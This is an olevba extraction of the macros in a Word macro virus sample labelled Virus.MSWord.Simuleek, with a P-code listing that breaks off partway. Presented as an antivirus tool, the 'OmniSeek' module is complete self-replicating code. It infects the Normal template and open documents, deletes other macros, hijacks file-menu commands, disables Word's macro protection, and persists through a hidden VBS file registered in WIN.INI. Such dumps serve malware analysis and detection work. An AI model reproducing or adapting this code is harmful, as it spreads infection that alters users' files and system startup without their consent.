olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Simuleek
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Simuleek - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OmniSeek.bas 
in file: Virus.MSWord.Simuleek - OLE stream: 'Macros/VBA/OmniSeek'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Mabuhay, mga kababayan ko sa iba't-ibang panig ng mundo!
' Sana ay maibigan nyo ang obra-maestrang ito.
'
' OmniSeek v0.1  May 28,2001
'   This is the OmniSeek (TM) Macro Protection System.
'   OmniSeek protects your WINWORD .doc files from harmful/mischievous
'   macro codes by checking every macros in each document you open.
'   Everytime you open a document, it examines its macro content and
'   determines if it has virus-like procedures. Every macros that
'   OmniSeek suspects as virus-like will be deleted from the document.
'   Whenever OmniSeek deletes a macro virus, it copies itself to the
'   infected document and assumes the name of the deleted virus. This
'   behavior is called "Virus Name Active Innoculation", because some
'   macro virus does not re-infect a document if they see their names
'   on it. OmniSeek does not delete macros which pass its examinations.
'   OmniSeek incorporates viral-capability to seek out harmful
'   macro virus. But unlike macro virus, OmniSeek does not disable any
'   toolbar or menu controls. So you can easily see OmniSeek's code
'   or delete OmniSeek if you don't like it. However, OmniSeek does
'   not undo any customizations that a harmful macro virus introduces
'   to your WINWORD.
'
'   OmniSeek is a creation of a Filipino mind.
'
'   ooxo ooox ooxx oxxo oxoo oxoo oxxo oooo
'

Option Explicit
Public wrd, windir, f, teks, seyba

'Simula 12/09/02 6:22:14 PM
Sub Simula(x)
 On Error Resume Next
 If InitVBS(1) And GetIn(1) <> 2 Then wrd.OnTime Now + TimeValue("00:00:02"), "MeShutDown", 0
 Set wrd = Nothing
 WScript.Quit
End Sub

Function InitVBS(x)
 Dim wsh, i, j, fl, fnm, txt
 On Error Resume Next
 InitVBS = False
 Set wsh = WScript.Application
 fnm = wsh.ScriptFullName
 windir = getWindir(1)
 If Err Or windir = "" Then Exit Function
 Set f = CreateObject("Scripting.FileSystemObject")
 txt = readTxt(fnm, True)
 fnm = f.buildpath(windir, "OmniSeek.vbs")
 writeTxt fnm, txt
 i = InStr(txt, "Simula")
 j = InStr(txt, "Sub Simula(x)")
 teks = Left(txt, i - 1) + "'Simula " + CStr(Now) + vbCrLf + Mid(txt, j)
 insertINI (1)
 Set wrd = CreateObject("Word.Application")
 fnm = wrd.NormalTemplate.FullName
 wrd.NormalTemplate.Saved = True
 wrd.Quit
 Set i = f.getfile(UCase(fnm))
 i.Attributes = 0
 InitVBS = True
End Function

Function getWindir(x)
 Dim wshl, env
 On Error Resume Next
 Set wshl = CreateObject("Wscript.Shell")
 Set env = wshl.Environment("PROCESS")
 getWindir = env("WINDIR")
 Set wshl = Nothing
 Set env = Nothing
 If Err Then getWindir = ""
End Function

Function readTxt(fnm, delete)
 Dim f, fl, txt, i
 On Error Resume Next
 Set f = CreateObject("Scripting.FileSystemObject")
 fnm = UCase(fnm)
 Set fl = f.getfile(fnm)
 fl.Attributes = 0
 On Error Resume Next
 Set fl = f.OpenTextFile(fnm, 1)
 txt = fl.readall
 For i = 0 To 9
  If Asc(Mid(txt, Len(txt), 1)) < 32 Then txt = Mid(txt, 1, Len(txt) - 1) Else Exit For
 Next
 fl.Close
 If Err Then
  readTxt = ""
 Else
  readTxt = txt
  If delete Then f.deletefile fnm, True
 End If
End Function

Function writeTxt(fnm, txt)
 Dim f, fl
 On Error Resume Next
 Set f = CreateObject("Scripting.FileSystemObject")
 fnm = UCase(fnm)
 Set fl = f.getfile(fnm)
 fl.Attributes = 0
 On Error Resume Next
 writeTxt = True
 Set fl = f.createtextfile(fnm, True)
 fl.write txt
 fl.Close
 If Err Then writeTxt = False
 Set fl = f.getfile(fnm)
 fl.Attributes = 2
End Function

Function insertINI(x)
 Dim fnm, txt, ini, i, j
 On Error Resume Next
 insertINI = False
 Set f = CreateObject("Scripting.FileSystemObject")
 fnm = f.buildpath(windir, "WIN.INI")
 txt = readTxt(fnm, True)
 If txt = "" Then Exit Function
 ini = UCase(txt)
 i = InStr(ini, vbLf + "RUN=")
 j = InStr(i + 1, ini, vbLf)
 writeTxt fnm, Mid(txt, 1, i) + "run=" + f.buildpath(windir, "OmniSeek.vbs") + Mid(txt, j - 1)
 If Err Then Exit Function
 insertINI = True
End Function

Function GetIn(x)
 Dim recent, d, fnm
 On Error Resume Next
 Set wrd = CreateObject("Word.Application")
 wrd.WordBasic.disableautomacros
 wrd.Options.VirusProtection = True
 wrd.Options.SaveNormalPrompt = False
 GetIn = 2
 If Err Then Exit Function
 Set recent = wrd.RecentFiles
 wrd.DisplayAlerts = 0
 fnm = UCase(recent(1).Name)
 If recent.Count <> 0 And (InStr(fnm, ".DOC") > 1 Or InStr(fnm, ".DOT") > 1) Then
  fnm = recent(1).Path + wrd.PathSeparator + recent(1).Name
  wrd.WordBasic.SetAttr fnm, 0
  wrd.Documents.Open (fnm)
 End If
 On Error Resume Next
 recent.Maximum = 0
 HawaNa (1)
 SeybNa (1)
 GetIn = 1
 If Err Then Exit Function
 GetIn = 0
End Function

Sub MeShutDown()
 On Error Resume Next
 Application.Quit
End Sub

Function isThreat(c)
 On Error Resume Next
 Dim txt, n
 txt = UCase(c.CodeModule.Lines(1, c.CodeModule.CountOfLines))
 n = UCase(c.Name)
 isThreat = False
 If InStr(txt, "FILENEW(") > 1 Or InStr(txt, "FILEOPEN(") > 1 Or InStr(txt, "FILESAVE(") > 1 Or InStr(txt, "FILESAVEAS(") > 1 Or InStr(txt, "FILECLOSE(") > 1 Then isThreat = True
 If InStr(txt, "AUTOEXEC(") > 1 Or InStr(txt, "AUTOOPEN(") > 1 Then isThreat = True
' If (n = "AUTOEXEC" Or n = "AUTOOPEN" Or n = "AUTOCLOSE" Or n = "AUTOEXIT") And InStr(txt, "MAIN(") Then isThreat = True
End Function

Sub HawaNa(x)
 Dim d, fnm
 On Error Resume Next
 Hawahan wrd.NormalTemplate
 For Each d In wrd.Documents
  fnm = UCase(d.FullName)
  If InStr(fnm, ".DOC") > 1 Or InStr(fnm, ".DOT") > 1 Then Hawahan d
 Next
End Sub

Sub Hawahan(d)
 On Error Resume Next
 Dim comps, c, wala, n, tmp
 Set comps = d.VBProject.VBComponents
 wala = True
 n = "OmniSeek"
 For Each c In comps
  If c.Type = 1 Then
    tmp = UCase(c.CodeModule.Lines(1, c.CodeModule.CountOfLines))
    If Mid(tmp, 3048) = Mid(UCase(teks), 3048) Then
      wala = False
      If d.FullName = wrd.NormalTemplate.FullName Then wrd.NormalTemplate.Saved = True
    ElseIf isThreat(c) Then
      n = c.Name
      comps.Remove c
    End If
  End If
 Next
 If wala Then
  Set c = comps.Add(1)
  c.CodeModule.AddFromString (teks)
  c.Name = n
  seyba = True
 End If
End Sub

Sub startOmni()
 On Error Resume Next
 InitVBA (1)
 ChkVBS (1)
 HawaNa (1)
End Sub

Sub InitVBA(x)
 Dim j, vbcs
 On Error Resume Next
 Set wrd = Application
 RecentFiles.Maximum = 4
 WordBasic.disableautomacros
 seyba = False
 Options.VirusProtection = True
 Options.SaveNormalPrompt = False
 Set vbcs = wrd.MacroContainer.VBProject.VBComponents
 j = vbcs.Count
 teks = vbcs(j).CodeModule.Lines(1, vbcs(j).CodeModule.CountOfLines)
End Sub

Function ChkVBS(x)
 Dim fnm, i, j, txt
 On Error Resume Next
 ChkVBS = False
 Set f = CreateObject("Scripting.FileSystemObject")
 windir = getWindir(1)
 If Err Or windir = "" Then Exit Function
 Set i = f.getfile(UCase(NormalTemplate.FullName))
 i.Attributes = 0
 fnm = f.buildpath(windir, "OmniSeek.vbs")
 If f.FileExists(fnm) Then
  ChkVBS = True
 Else
  i = InStr(teks, "'Simula")
  j = InStr(teks, "Sub Simula(x)")
  txt = Mid(teks, 1, i - 1) + "Simula 1" + vbCrLf + Mid(teks, j)
  writeTxt fnm, txt
  insertINI (1)
 End If
 fnm = f.buildpath(windir, "OFFITEMS.LOG")
 Set i = f.getfile(fnm)
 i.Attributes = 0
 If i.Size > 99999 Then f.deletefile fnm, True
 ChkVBS = True
End Function

Sub SeybNa(x)
 Dim d
 On Error Resume Next
 If seyba Then
  For Each d In wrd.Documents
   If Not d.ReadOnly Then
    d.Save
    d.Close
   Else: d.Close 0
   End If
  Next
  seyba = False
 End If
End Sub

Sub ToolsOptions()
 On Error Resume Next
 Dialogs(wdDialogToolsOptions).Show
 InitVBA (1)
End Sub

Sub ToolsMacro()
 On Error Resume Next
 startOmni
 Dialogs(wdDialogToolsMacro).Show
End Sub

Sub ViewVBCode()
 On Error Resume Next
 startOmni
 ShowVisualBasicEditor = True
End Sub

Sub AutoOpen()
 On Error Resume Next
 startOmni
End Sub

Sub FileOpen()
 On Error Resume Next
 Dim vbcs
 InitVBA (1)
 HawaNa (1)
 With Dialogs(wdDialogFileOpen)
  .Display
  Options.VirusProtection = False
  Set vbcs = NormalTemplate.VBProject.VBComponents
  Application.OnTime Now + TimeValue("00:00:01"), "Normal." + vbcs(vbcs.Count).Name + ".startOmni", 0
  .Execute
 End With
End Sub

Sub FileSave()
 On Error Resume Next
 Dim t
 t = Application.DisplayAlerts
 Application.DisplayAlerts = 0
 If ActiveDocument.Path = "" Then
   Application.DisplayAlerts = t
   FileSaveAs
  Else
   If Not ActiveDocument.Saved Then
    InitVBA (1)
    HawaNa (1)
    ActiveDocument.Save
    ChkVBS (1)
   End If
 End If
 HawaNa (1)
 Application.DisplayAlerts = t
End Sub

Sub FileSaveAs()
 On Error Resume Next
 Dialogs(wdDialogFileSaveAs).Show
 InitVBA (1)
 HawaNa (1)
 ChkVBS (1)
 ActiveDocument.Save
End Sub

Sub FileClose()
 On Error Resume Next
 InitVBA (1)
 HawaNa (1)
 ChkVBS (1)
 ActiveDocument.Close
End Sub

Sub FileExit()
 On Error Resume Next
 startOmni
 SeybNa (1)
 wrd.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Simuleek
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/OmniSeek - 19481 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0039 " Mabuhay, mga kababayan ko sa iba't-ibang panig ng mundo!"
' Line #1:
' 	QuoteRem 0x0000 0x002D " Sana ay maibigan nyo ang obra-maestrang ito."
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x001B " OmniSeek v0.1  May 28,2001"
' Line #4:
' 	QuoteRem 0x0000 0x0035 "   This is the OmniSeek (TM) Macro Protection System."
' Line #5:
' 	QuoteRem 0x0000 0x0045 "   OmniSeek protects your WINWORD .doc files from harmful/mischievous"
' Line #6:
' 	QuoteRem 0x0000 0x0042 "   macro codes by checking every macros in each document you open."
' Line #7:
' 	QuoteRem 0x0000 0x0043 "   Everytime you open a document, it examines its macro content and"
' Line #8:
' 	QuoteRem 0x0000 0x0040 "   determines if it has virus-like procedures. Every macros that"
' Line #9:
' 	QuoteRem 0x0000 0x0045 "   OmniSeek suspects as virus-like will be deleted from the document."
' Line #10:
' 	QuoteRem 0x0000 0x0043 "   Whenever OmniSeek deletes a macro virus, it copies itself to the"
' Line #11:
' 	QuoteRem 0x0000 0x0044 "   infected document and assumes the name of the deleted virus. This"
' Line #12:
' 	QuoteRem 0x0000 0x0044 "   behavior is called "Virus Name Active Innoculation", because some"
' Line #13:
' 	QuoteRem 0x0000 0x0044 "   macro virus does not re-infect a document if they see their names"
' Line #14:
' 	QuoteRem 0x0000 0x0046 "   on it. OmniSeek does not delete macros which pass its examinations."
' Line #15:
' 	QuoteRem 0x0000 0x003D "   OmniSeek incorporates viral-capability to seek out harmful"
' Line #16:
' 	QuoteRem 0x0000 0x0045 "   macro virus. But unlike macro virus, OmniSeek does not disable any"
' Line #17:
' 	QuoteRem 0x0000 0x0042 "   toolbar or menu controls. So you can easily see OmniSeek's code"
' Line #18:
' 	QuoteRem 0x0000 0x0042 "   or delete OmniSeek if you don't like it. However, OmniSeek does"
' Line #19:
' 	QuoteRem 0x0000 0x0044 "   not undo any customizations that a harmful macro virus introduces"
' Line #20:
' 	QuoteRem 0x0000 0x0013 "   to your WINWORD."
' Line #21:
' 	QuoteRem 0x0000 0x0000 ""
' Line #22:
' 	QuoteRem 0x0000 0x002D "   OmniSeek is a creation of a Filipino mind."
' Line #23:
' 	QuoteRem 0x0000 0x0000 ""
' Line #24:
' 	QuoteRem 0x0000 0x002A "   ooxo ooox ooxx oxxo oxoo oxoo oxxo oooo"
' Line #25:
' 	QuoteRem 0x0000 0x0000 ""
' Line #26:
' Line #27:
' 	Option  (Explicit)
' Line #28:
' 	Dim (Public) 
' 	VarDefn wrd
' 	VarDefn windir
' 	VarDefn False
' 	VarDefn teks
' 	VarDefn seyba
' Line #29:
' Line #30:
' 	QuoteRem 0x0000 0x001A "Simula 12/09/02 6:22:14 PM"
' Line #31:
' 	FuncDefn (Sub Simula(x))
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	LitDI2 0x0001 
' 	ArgsLd InitVBS 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd GetIn 0x0001 
' 	LitDI2 0x0002 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0008 "00:00:02"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000A "MeShutDown"
' 	LitDI2 0x0000 
' 	Ld wrd 
' 	ArgsMemCall OnTime 0x0003 
' 	EndIf 
' Line #34:
' 	SetStmt 
' 	LitNothing 
' 	Set wrd 
' Line #35:
' 	Ld WScript 
' 	ArgsMemCall Quit 0x0000 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Function InitVBS(x))
' Line #39:
' 	Dim 
' 	VarDefn wsh
' 	VarDefn i
' 	VarDefn j
' 	VarDefn fl
' 	VarDefn fnm
' 	VarDefn txt
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	LitVarSpecial (False)
' 	St InitVBS 
' Line #42:
' 	SetStmt 
' 	Ld WScript 
' 	MemLd Application 
' 	Set wsh 
' Line #43:
' 	Ld wsh 
' 	MemLd ScriptFullName 
' 	St fnm 
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd getWindir 0x0001 
' 	St windir 
' Line #45:
' 	Ld Err 
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #46:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set False 
' Line #47:
' 	Ld fnm 
' 	LitVarSpecial (True)
' 	ArgsLd readTxt 0x0002 
' 	St txt 
' Line #48:
' 	Ld windir 
' 	LitStr 0x000C "OmniSeek.vbs"
' 	Ld False 
' 	ArgsMemLd buildpath 0x0002 
' 	St fnm 
' Line #49:
' 	Ld fnm 
' 	Ld txt 
' 	ArgsCall writeTxt 0x0002 
' Line #50:
' 	Ld txt 
' 	LitStr 0x0006 "Simula"
' 	FnInStr 
' 	St i 
' Line #51:
' 	Ld txt 
' 	LitStr 0x000D "Sub Simula(x)"
' 	FnInStr 
' 	St j 
' Line #52:
' 	Ld txt 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "'Simula "
' 	Add 
' 	Ld Now 
' 	Coerce (Str) 
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	Ld txt 
' 	Ld j 
' 	ArgsLd Mid$ 0x0002 
' 	Add 
' 	St teks 
' Line #53:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall insertINI 0x0001 
' Line #54:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set wrd 
' Line #55:
' 	Ld wrd 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	St fnm 
' Line #56:
' 	LitVarSpecial (True)
' 	Ld wrd 
' 	MemLd NormalTemplate 
' 	MemSt Saved 
' Line #57:
' 	Ld wrd 
' 	ArgsMemCall Quit 0x0000 
' Line #58:
' 	SetStmt 
' 	Ld fnm 
' 	ArgsLd UCase 0x0001 
' 	Ld False 
' 	ArgsMemLd getfile 0x0001 
' 	Set i 
' Line #59:
' 	LitDI2 0x0000 
' 	Ld i 
' 	MemSt Attributes 
' Line #60:
' 	LitVarSpecial (True)
' 	St InitVBS 
' Line #61:
' 	EndFunc 
' Line #62:
' Line #63:
' 	FuncDefn (Function getWindir(x))
' Line #64:
' 	Dim 
' 	VarDefn wshl
' 	VarDefn env
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	SetStmt 
' 	LitStr 0x000D "Wscript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set wshl 
' Line #67:
' 	SetStmt 
' 	LitStr 0x0007 "PROCESS"
' 	Ld wshl 
' 	ArgsMemLd Environment 0x0001 
' 	Set env 
' Line #68:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd env 0x0001 
' 	St getWindir 
' Line #69:
' 	SetStmt 
' 	LitNothing 
' 	Set wshl 
' Line #70:
' 	SetStmt 
' 	LitNothing 
' 	Set env 
' Line #71:
' 	Ld Err 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St getWindir 
' 	EndIf 
' Line #72:
' 	EndFunc 
' Line #73:
' Line #74:
' 	FuncDefn (Function readTxt(fnm, delete))
' Line #75:
' 	Dim 
' 	VarDefn False
' 	VarDefn fl
' 	VarDefn txt
' 	VarDefn i
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set False 
' Line #78:
' 	Ld fnm 
' 	ArgsLd UCase 0x0001 
' 	St fnm 
' Line #79:
' 	SetStmt 
' 	Ld fnm 
' 	Ld False 
' 	ArgsMemLd getfile 0x0001 
' 	Set fl 
' Line #80:
' 	LitDI2 0x0000 
' 	Ld fl 
' 	MemSt Attributes 
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	SetStmt 
' 	Ld fnm 
' 	LitDI2 0x0001 
' 	Ld False 
' 	ArgsMemLd OpenTextFile 0x0002 
' 	Set fl 
' Line #83:
' 	Ld fl 
' 	MemLd readall 
' 	St txt 
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0009 
' 	For 
' Line #85:
' 	Ld txt 
' 	Ld txt 
' 	FnLen 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0020 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld txt 
' 	LitDI2 0x0001 
' 	Ld txt 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St txt 
' 	Else 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #86:
' 	StartForVariable 
' 	Next 
' Line #87:
' 	Ld fl 
' 	ArgsMemCall Close 0x0000 
' Line #88:
' 	Ld Err 
' 	IfBlock 
' Line #89:
' 	LitStr 0x0000 ""
' 	St readTxt 
' Line #90:
' 	ElseBlock 
' Line #91:
' 	Ld txt 
' 	St readTxt 
' Line #92:
' 	Ld delete 
' 	If 
' 	BoSImplicit 
' 	Ld fnm 
' 	LitVarSpecial (True)
' 	Ld False 
' 	ArgsMemCall deletefile 0x0002 
' 	EndIf 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndFunc 
' Line #95:
' Line #96:
' 	FuncDefn (Function writeTxt(fnm, txt))
' Line #97:
' 	Dim 
' 	VarDefn False
' 	VarDefn fl
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set False 
' Line #100:
' 	Ld fnm 
' 	ArgsLd UCase 0x0001 
' 	St fnm 
' Line #101:
' 	SetStmt 
' 	Ld fnm 
' 	Ld False 
' 	ArgsMemLd getfile 0x0001 
' 	Set fl 
' Line #102:
' 	LitDI2 0x0000 
' 	Ld fl 
' 	MemSt Attributes 
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	LitVarSpecial (True)
' 	St writeTxt 
' Line #105:
' 	SetStmt 
' 	Ld fnm 
' 	LitVarSpecial (True)
' 	Ld False 
' 	ArgsMemLd createtextfile 0x0002 
' 	Set fl 
' Line #106:
' 	Ld txt 
' 	Ld fl 
' 	ArgsMemCall Xor 0x0001 
' Line #107:
' 	Ld fl 
' 	ArgsMemCall Close 0x0000 
' Line #108:
' 	Ld Err 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St writeTxt 
' 	EndIf 
' Line #109:
' 	SetStmt 
' 	Ld fnm 
' 	Ld False 
' 	ArgsMemLd getfile 0x0001 
' 	Set fl 
' Line #110:
' 	LitDI2 0x0002 
' 	Ld fl 
' 	MemSt Attributes 
' Line #111:
' 	EndFunc 
' Line #112:
' Line #113:
' 	FuncDefn (Function insertINI(x))
' Line #114:
' 	Dim 
' 	VarDefn fnm
' 	VarDefn txt
' 	VarDefn ini
' 	VarDefn i
' 	VarDefn j
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	LitVarSpecial (False)
' 	St insertINI 
' Line #117:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set False 
' Line #118:
' 	Ld windir 
' 	LitStr 0x0007 "WIN.INI"
' 	Ld False 
' 	ArgsMemLd buildpath 0x0002 
' 	St fnm 
' Line #119:
' 	Ld fnm 
' 	LitVarSpecial (True)
' 	ArgsLd readTxt 0x0002 
' 	St txt 
' Line #120:
' 	Ld txt 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #121:
' 	Ld txt 
' 	ArgsLd UCase 0x0001 
' 	St ini 
' Line #122:
' 	Ld ini 
' 	Ld vbLf 
' 	LitStr 0x0004 "RUN="
' 	Add 
' 	FnInStr 
' 	St i 
' Line #123:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ini 
' 	Ld vbLf 
' 	FnInStr3 
' 	St j 
' Line #124:
' 	Ld fnm 
' 	Ld txt 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0004 "run="
' 	Add 
' 	Ld windir 
' 	LitStr 0x000C "OmniSeek.vbs"
' 	Ld False 
' 	ArgsMemLd buildpath 0x0002 
' 	Add 
' 	Ld txt 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0002 
' 	Add 
' 	ArgsCall writeTxt 0x0002 
' Line #125:
' 	Ld Err 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #126:
' 	LitVarSpecial (True)
' 	St insertINI 
' Line #127:
' 	EndFunc 
' Line #128:
' Line #129:
' 	FuncDefn (Function GetIn(x))
' Line #130:
' 	Dim 
' 	VarDefn recent
' 	VarDefn d
' 	VarDefn fnm
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set wrd 
' Line #133:
' 	Ld wrd 
' 	MemLd WordBasic 
' 	ArgsMemCall disableautomacros 0x0000 
' Line #134:
' 	LitVarSpecial (True)
' 	Ld wrd 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #135:
' 	LitVarSpecial (False)
' 	Ld wrd 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #136:
' 	LitDI2 0x0002 
' 	St GetIn 
' Line #137:
' 	Ld Err 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #138:
' 	SetStmt 
' 	Ld wrd 
' 	MemLd RecentFiles 
' 	Set recent 
' Line #139:
' 	LitDI2 0x0000 
' 	Ld wrd 
' 	MemSt DisplayAlerts 
' Line #140:
' 	LitDI2 0x0001 
' 	ArgsLd recent 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	St fnm 
' Line #141:
' 	Ld recent 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld fnm 
' 	LitStr 0x0004 ".DOC"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Ld fnm 
' 	LitStr 0x0004 ".DOT"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #142:
' 	LitDI2 0x0001 
' 	ArgsLd recent 0x0001 
' 	MemLd Path 
' 	Ld wrd 
' 	MemLd PathSeparator 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd recent 0x0001 
' 	MemLd New 
' 	Add 
' 	St fnm 
' Line #143:
' 	Ld fnm 
' 	LitDI2 0x0000 
' 	Ld wrd 
' 	MemLd WordBasic 
' 	ArgsMemCall SetAttr 0x0002 
' Line #144:
' 	Ld fnm 
' 	Paren 
' 	Ld wrd 
' 	MemLd Documents 
' 	ArgsMemCall Option 0x0001 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	LitDI2 0x0000 
' 	Ld recent 
' 	MemSt Maximum 
' Line #148:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall HawaNa 0x0001 
' Line #149:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall SeybNa 0x0001 
' Line #150:
' 	LitDI2 0x0001 
' 	St GetIn 
' Line #151:
' 	Ld Err 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #152:
' 	LitDI2 0x0000 
' 	St GetIn 
' Line #153:
' 	EndFunc 
' Line #154:
' Line #155:
' 	FuncDefn (Sub MeShutDown())
' Line #156:
' 	OnError (Resume Next) 
' Line #157:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' Line #160:
' 	FuncDefn (Function isThreat(c))
' Line #161:
' 	OnError (Resume Next) 
' Line #162:
' 	Dim 
' 	VarDefn txt
' 	VarDefn n
' Line #163:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld c 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St txt 
' Line #164:
' 	Ld c 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	St n 
' Line #165:
' 	LitVarSpecial (False)
' 	St isThreat 
' Line #166:
' 	Ld txt 
' 	LitStr 0x0008 "FILENEW("
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Ld txt 
' 	LitStr 0x0009 "FILEOPEN("
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	Ld txt 
' 	LitStr 0x0009 "FILESAVE("
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	Ld txt 
' 	LitStr 0x000B "FILESAVEAS("
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	Ld txt 
' 	LitStr 0x000A "FILECLOSE("
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St isThreat 
' 	EndIf 
' Line #167:
' 	Ld txt 
' 	LitStr 0x0009 "AUTOEXEC("
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Ld txt 
' 	LitStr 0x0009 "AUTOOPEN("
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St isThreat 
' 	EndIf 
' Line #168:
' 	QuoteRem 0x0000 0x0078 " If (n = "AUTOEXEC" Or n = "AUTOOPEN" Or n = "AUTOCLOSE" Or n = "AUTOEXIT") And InStr(txt, "MAIN(") Then isThreat = True"
' Line #169:
' 	EndFunc 
' Line #170:
' Line #171:
' 	FuncDefn (Sub HawaNa(x))
' Line #172:
' 	Dim 
' 	VarDefn d
' 	VarDefn fnm
' Line #173:
' 	OnError (Resume Next) 
' Line #174:
' 	Ld wrd 
' 	MemLd NormalTemplate 
' 	ArgsCall Hawahan 0x0001 
' Line #175:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld wrd 
' 	MemLd Documents 
' 	ForEach 
' Line #176:
' 	Ld d 
' 	MemLd FullName 
' 	ArgsLd UCase 0x0001 
' 	St fnm 
' Line #177:
' 	Ld fnm 
' 	LitStr 0x0004 ".DOC"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Ld fnm 
' 	LitStr 0x0004 ".DOT"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld d 
' 	ArgsCall Hawahan 0x0001 
' 	EndIf 
' Line #178:
' 	StartForVariable 
